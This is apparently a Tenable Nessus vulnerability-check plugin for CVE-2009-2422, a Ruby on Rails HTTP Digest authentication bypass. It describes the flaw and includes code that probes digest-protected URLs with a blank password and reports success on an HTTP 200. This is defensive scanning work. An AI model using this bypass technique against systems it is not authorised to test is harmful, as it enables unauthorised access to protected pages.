#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");


if (description)
{
  script_id(40334);
  script_version("$Revision: 1.9 $");
  script_cvs_date("$Date: 2014/08/28 03:40:59 $");

  script_cve_id("CVE-2009-2422");
  script_bugtraq_id(35579);
  script_osvdb_id(55664);
  script_xref(name:"Secunia", value:"35702");

  script_name(english:"Ruby on Rails HTTP Digest Authentication Bypass");
  script_summary(english:"Tries to bypass authentication");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an application that is prone to an
authentication bypass attack.");
  script_set_attribute(attribute:"description", value:
"The remote web server appears to use a version of Ruby on Rails that
contains a vulnerability in its HTTP Digest authentication support. 
Specifically, the 'authenticate_or_request_with_http_digest' function
in 'lib/action_controller/http_authentication.rb' of the 'actionpack'
gem does not treat a 'nil' response as an authentication failure but
instead continues to compare that to the password supplied by the
user.  A remote attacker may be able to leverage this issue to gain
access to a page protected using HTTP Digest authentication by sending
as part of the request a nil username / password or any username and
no password.");
  script_set_attribute(
    attribute:"see_also", 
    value:"http://n8.tumblr.com/post/117477059/security-hole-found-in-rails-2-3s"
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://weblog.rubyonrails.org/2009/6/3/security-problem-with-authenticate_with_http_digest"
  );
  script_set_attribute(attribute:"solution", value:
"Either edit the application to ensure that authentication blocks
never return nil or upgrade to Rails 2.3.3.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(287);

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/06/03");
  script_set_attribute(attribute:"patch_publication_date", value:"2009/06/03");
  script_set_attribute(attribute:"plugin_publication_date", value:"2009/07/21");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:rubyonrails:ruby_on_rails");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2014 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "webmirror.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);


# Loop through directories known to require authentication.
urls = get_kb_list(strcat("www/", port, "/content/digest_auth/url/*"));
if (isnull(urls)) exit(0, "No pages requiring digest authentication were found on port "+port);
urls = make_list(urls);

foreach url (urls)
{
  # Make sure the page looks like RoR with HTTP Digest auth.
  res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail: 1);

  if (
    res[0] =~ "^HTTP/1\.[01] 401 " &&
    "HTTP Digest: Access denied." >< res[2] &&
    egrep(
      pattern:'^WWW-Authenticate: *Digest realm="[^"]+", qop="[^"]+", algorithm=MD5, nonce="[^"]+", opaque="[^"]+"', 
      string:res[1]
    )
  )
  {
    # Try to exploit the issue.
    req = http_mk_get_req(port:port, item:url);
    req = http_add_auth_to_req(
      req      : req, 
      headers  : res[1], 
      username : SCRIPT_NAME, 
      password : ""
    );
    res = http_send_recv_req(port:port, req:req, exit_on_fail: 1);

    # There's a problem if we're logged in.
    if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 200 .*", string: res[0]))
    {
      security_hole(port);
      exit(0);
    }
  }
}
exit(0, "The web server on port "+port+" is not affected.");
